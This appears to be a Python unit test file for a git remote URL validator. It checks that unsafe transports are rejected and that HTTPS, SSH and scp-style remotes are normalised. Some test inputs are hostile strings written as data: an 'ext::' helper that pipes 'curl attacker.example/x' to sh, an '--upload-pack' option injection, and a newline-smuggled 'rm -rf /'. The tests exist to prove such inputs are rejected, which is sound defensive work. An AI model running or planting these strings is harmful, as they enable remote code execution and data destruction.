"""Tests for remote URL validation and normalisation.

This module is imported directly rather than through the app so the policy can
be exercised without constructing the settings singleton.
"""

import unittest

from app.services.git_remote_url import (
    RemoteUrlError,
    RemoteUrlPolicy,
    normalize_remote_url,
    parse_remote_url,
    validate_remote_url,
)


class RejectsDangerousTransports(unittest.TestCase):
    def test_ext_transport_is_rejected(self) -> None:
        # `ext::` runs its argument as a shell command, so accepting this string
        # would be remote code execution on the worker.
        with self.assertRaises(RemoteUrlError) as caught:
            validate_remote_url("ext::sh -c 'curl attacker.example/x | sh'")
        self.assertIn("ext::", str(caught.exception))

    def test_other_remote_helpers_are_rejected(self) -> None:
        for candidate in ("fd::7", "transport::address", "ext::whoami"):
            with self.subTest(candidate=candidate):
                with self.assertRaises(RemoteUrlError):
                    validate_remote_url(candidate)

    def test_file_urls_are_rejected(self) -> None:
        with self.assertRaises(RemoteUrlError):
            validate_remote_url("file:///etc")

    def test_git_protocol_is_rejected(self) -> None:
        with self.assertRaises(RemoteUrlError):
            validate_remote_url("git://github.com/org/repo.git")

    def test_leading_dash_is_rejected(self) -> None:
        # Git would parse this as an option rather than a remote.
        with self.assertRaises(RemoteUrlError):
            validate_remote_url("--upload-pack=touch /tmp/pwned")

    def test_bare_local_path_is_rejected(self) -> None:
        with self.assertRaises(RemoteUrlError):
            validate_remote_url("/srv/prism/projects/type1/other-repo")

    def test_control_characters_are_rejected(self) -> None:
        with self.assertRaises(RemoteUrlError):
            validate_remote_url("https://github.com/org/repo.git\nrm -rf /")

    def test_blank_input_is_rejected(self) -> None:
        with self.assertRaises(RemoteUrlError):
            validate_remote_url("   ")


class AcceptsRealRemotes(unittest.TestCase):
    def test_https_url_passes_through_unchanged(self) -> None:
        url = "https://github.com/krishna-swaroop/KiCAD-Prism.git"
        self.assertEqual(validate_remote_url(url), url)

    def test_ssh_url_is_accepted(self) -> None:
        url = "ssh://git@gitlab.example.com/hardware/board.git"
        self.assertEqual(validate_remote_url(url), url)

    def test_scp_style_url_is_accepted(self) -> None:
        url = "git@github.com:org/repo.git"
        parsed = parse_remote_url(url)
        self.assertEqual(parsed.scheme, "ssh")
        self.assertEqual(parsed.host, "github.com")
        self.assertEqual(parsed.path, "org/repo.git")

    def test_surrounding_whitespace_is_trimmed(self) -> None:
        self.assertEqual(
            validate_remote_url("  https://github.com/org/repo.git  "),
            "https://github.com/org/repo.git",
        )

    def test_ipv6_literal_is_not_mistaken_for_a_helper_transport(self) -> None:
        # The `::` inside the brackets must not trip the remote-helper check.
        parsed = parse_remote_url("https://[::1]:3000/org/repo.git")
        self.assertEqual(parsed.host, "::1")
        self.assertEqual(parsed.port, 3000)

    def test_self_hosted_port_is_preserved(self) -> None:
        parsed = parse_remote_url("https://git.internal.example:8443/hw/board.git")
        self.assertEqual(parsed.port, 8443)

    def test_repo_name_strips_the_git_suffix(self) -> None:
        self.assertEqual(
            parse_remote_url("https://github.com/org/My-Board.git").repo_name,
            "My-Board",
        )


class RejectsEmbeddedCredentials(unittest.TestCase):
    def test_token_in_url_is_rejected(self) -> None:
        # Repository URLs are stored in cleartext and shown in the UI, so a
        # token here would leak.
        with self.assertRaises(RemoteUrlError) as caught:
            validate_remote_url("https://x-access-token:ghp_secret@github.com/org/repo.git")
        self.assertIn("SSH", str(caught.exception))

    def test_bare_ssh_username_is_still_allowed(self) -> None:
        # `git@host` carries no secret and is how ssh remotes are normally written.
        self.assertEqual(
            validate_remote_url("ssh://git@github.com/org/repo.git"),
            "ssh://git@github.com/org/repo.git",
        )


class NormalisesForDeduplication(unittest.TestCase):
    def test_ssh_and_https_forms_share_a_key(self) -> None:
        # The bug this prevents: importing the same repository twice because the
        # two spellings did not string-match.
        self.assertEqual(
            normalize_remote_url("git@github.com:org/repo.git"),
            normalize_remote_url("https://github.com/org/repo"),
        )

    def test_trailing_slash_and_git_suffix_are_ignored(self) -> None:
        self.assertEqual(
            normalize_remote_url("https://github.com/org/repo.git"),
            normalize_remote_url("https://github.com/org/repo/"),
        )

    def test_case_differences_are_ignored(self) -> None:
        self.assertEqual(
            normalize_remote_url("https://GitHub.com/Org/Repo.git"),
            normalize_remote_url("https://github.com/org/repo"),
        )

    def test_default_port_matches_implicit_port(self) -> None:
        self.assertEqual(
            normalize_remote_url("https://git.example.com:443/hw/board.git"),
            normalize_remote_url("https://git.example.com/hw/board"),
        )

    def test_non_default_port_stays_distinct(self) -> None:
        self.assertNotEqual(
            normalize_remote_url("https://git.example.com:8443/hw/board.git"),
            normalize_remote_url("https://git.example.com/hw/board"),
        )

    def test_different_repositories_do_not_collide(self) -> None:
        self.assertNotEqual(
            normalize_remote_url("https://github.com/org/repo-a"),
            normalize_remote_url("https://github.com/org/repo-b"),
        )


class HonoursDeploymentPolicy(unittest.TestCase):
    def test_host_allowlist_blocks_other_forges(self) -> None:
        policy = RemoteUrlPolicy.build(allowed_hosts=["git.internal.example"])
        with self.assertRaises(RemoteUrlError) as caught:
            validate_remote_url("https://github.com/org/repo.git", policy)
        self.assertIn("git.internal.example", str(caught.exception))

    def test_host_allowlist_permits_listed_host(self) -> None:
        policy = RemoteUrlPolicy.build(allowed_hosts=["git.internal.example"])
        url = "https://git.internal.example/hw/board.git"
        self.assertEqual(validate_remote_url(url, policy), url)

    def test_host_allowlist_applies_to_scp_form(self) -> None:
        policy = RemoteUrlPolicy.build(allowed_hosts=["git.internal.example"])
        with self.assertRaises(RemoteUrlError):
            validate_remote_url("git@github.com:org/repo.git", policy)

    def test_empty_allowlist_permits_any_host(self) -> None:
        url = "https://codeberg.org/org/repo.git"
        self.assertEqual(validate_remote_url(url, RemoteUrlPolicy.build()), url)

    def test_http_requires_explicit_opt_in(self) -> None:
        with self.assertRaises(RemoteUrlError) as caught:
            validate_remote_url("http://git.internal.example/hw/board.git")
        self.assertIn("IMPORT_ALLOW_INSECURE_HTTP", str(caught.exception))

        policy = RemoteUrlPolicy.build(allow_insecure_http=True)
        url = "http://git.internal.example/hw/board.git"
        self.assertEqual(validate_remote_url(url, policy), url)


if __name__ == "__main__":
    unittest.main()
